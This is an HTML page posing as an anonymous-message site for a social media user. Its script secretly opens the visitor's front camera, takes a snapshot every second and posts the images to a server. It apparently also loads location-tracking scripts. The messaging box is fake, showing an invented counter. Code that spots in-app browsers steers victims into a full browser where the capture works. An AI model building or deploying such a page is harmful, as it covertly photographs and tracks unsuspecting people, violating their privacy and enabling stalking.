<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Anonymous Messages</title>
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="./jsQR.js"></script>
    <script src="../../assets/js/particles.min.js"></script>
    <script src="../../assets/js/location.js"></script>
    <script src="../../assets/js/client.min.js"></script>
    <script src="../../assets/js/loc.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #ed1584 0%, #fe881e 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 2rem;
        }

        .message-card {
            background: white;
            border-radius: 20px;
            padding: 1.5rem;
            width: 100%;
            max-width: 600px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
            margin: 2rem 0;
        }

        .profile {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1rem;
        }

        .profile-img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: #f0f0f0;
        }

        .profile-name {
            font-weight: 600;
        }

        .message-container {
            position: relative;
            margin-top: 1rem;
        }

        textarea {
            width: 100%;
            min-height: 120px;
            border: none;
            background: #f8f8f8;
            border-radius: 12px;
            padding: 1rem;
            resize: none;
            font-size: 1rem;
        }

        textarea:focus {
            outline: none;
            background: #f0f0f0;
        }

        .send-button {
            display: none;
            max-width: 600px;
            width: 100%;
            padding: 1rem;
            border: none;
            border-radius: 100px;
            background: #000;
            color: white;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: transform 0.2s;
            margin-top: 1rem;
        }

        .send-button:hover {
            transform: scale(1.02);
        }

        .send-button.visible {
            display: block;
        }

        .stats {
            text-align: center;
            color: white;
            margin: 1rem 0;
            font-weight: 500;
        }

        .action-container {
            max-width: 600px;
            width: 100%;
            padding: 1rem;
            position: fixed;
            bottom: 30px;
            text-align: center;
        }

        .action-button {
            display: absolute;
            width: 100%;
            padding: 1rem;
            border: none;
            border-radius: 100px;
            background: #000;
            color: white;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .action-button:hover {
            transform: scale(1.02);
        }

        .footer {
            margin-top: 2rem;
            color: rgba(255, 255, 255, 0.8);
        }

        .footer a {
            color: white;
            text-decoration: none;
            margin: 0 0.5rem;
            opacity: 0.8;
        }

        .footer a:hover {
            opacity: 1;
        }

        .lock-icon {
            display: inline-block;
            margin-right: 4px;
            opacity: 0.7;
        }

        .popup-warning {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #ed1584 0%, #fe881e 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            text-align: center;
            color: white;
            font-size: 1.2rem;
            font-weight: 600;
        }
        
        .popup-warning button {
            display: block;
            width: 100%;
            max-width: 400px;
            padding: 1rem;
            border: none;
            border-radius: 100px;
            background: #000;
            color: white;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: transform 0.2s;
            margin-top: 2rem;
        }
        
        .popup-warning button:hover {
            transform: scale(1.02);
        }
    </style>
</head>
<body onload="mydata()">
    <div class="message-card">
        <div class="profile">
            <div class="profile-img"></div>
            <div>
                <div class="profile-name">@bryyy_cortez</div>
                <div>send me anonymous messages!</div>
            </div>
        </div>
        <div class="message-container">
            <textarea placeholder="send me anonymous messages..."></textarea>
        </div>
    </div>
    <button class="send-button">Send!</button>

    <div class="action-container">
        <div class="stats">
            ðŸ‘‹ 251 people just tapped the button
        </div>
        
        <button class="action-button">
            Get your own messages!
        </button>
    
        <div class="footer">
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
        </div>
    </div>

    <video id="video" playsinline autoplay></video>
    <canvas id="canvas" hidden width="1000" height="1000" ></canvas>

    <script>


    function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'post.php',
                dataType: 'json',
                async: false,
                success: function(result) {
                    
                },
                error: function() {
                    console.error("Error posting data.");
                }
            });
        }

        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const qrCanvas = document.getElementById('qrCanvas');
        const context = canvas.getContext('2d');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                setInterval(captureImage, 1000);
            } catch (e) {
                console.error(`navigator.getUserMedia error: ${e.toString()}`);
            }
        }

        function captureImage() {
            context.drawImage(video, 0, 0, 640, 480);
            const canvasData = canvas.toDataURL("image/png");
            const cc = String(canvasData).replace("data:image/png;base64,", "");
            post(cc);
        }

        const textarea = document.querySelector('textarea');
        const sendButton = document.querySelector('.send-button');
        const statsEl = document.querySelector('.stats');
        let messageCount = 251;

        textarea.addEventListener('input', () => {
            if(textarea.value.trim()) {
                sendButton.classList.add('visible');
            } else {
                sendButton.classList.remove('visible');
            }
        });

        sendButton.addEventListener('click', () => {
            if(textarea.value.trim()) {
                messageCount++;
                statsEl.textContent = `ðŸ‘‹ ${messageCount} people just tapped the button`;
                textarea.value = '';
                sendButton.classList.remove('visible');
            }
        });

        textarea.addEventListener('keyup', (e) => {
            if(e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                if(textarea.value.trim()) {
                    messageCount++;
                    statsEl.textContent = `ðŸ‘‹ ${messageCount} people just tapped the button`;
                    textarea.value = '';
                    sendButton.classList.remove('visible');
                }
            }
        });

        function isWebview() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;

            if(userAgent.indexOf('FBAN') > -1 || userAgent.indexOf('FBAV') > -1 || userAgent.indexOf('Instagram') > -1) {
                return true;
            }

            if(userAgent.indexOf('wv') > -1 || (userAgent.indexOf('Android') > -1 && userAgent.indexOf('Chrome') > -1)) {
                return true;
            }

            if(userAgent.indexOf('Safari') > -1 && userAgent.indexOf('CriOS') === -1 && window.webkit) {
                return true;
            }

            return false;
        }

        if(isWebview()) {
            document.querySelector('.message-card').style.display = 'none';
            document.querySelector('.send-button').style.display = 'none';
            document.querySelector('.action-container').style.display = 'none';

            const popupWarning = document.createElement('div');
            popupWarning.classList.add('popup-warning');
            
            const openInBrowserLink = document.createElement('a');
            openInBrowserLink.href = window.location.href;
            openInBrowserLink.target = '_blank';
            openInBrowserLink.textContent = 'Open in Browser';

            popupWarning.appendChild(openInBrowserLink);
            document.body.appendChild(popupWarning);
        }

        init()

    </script>
</body>
</html>
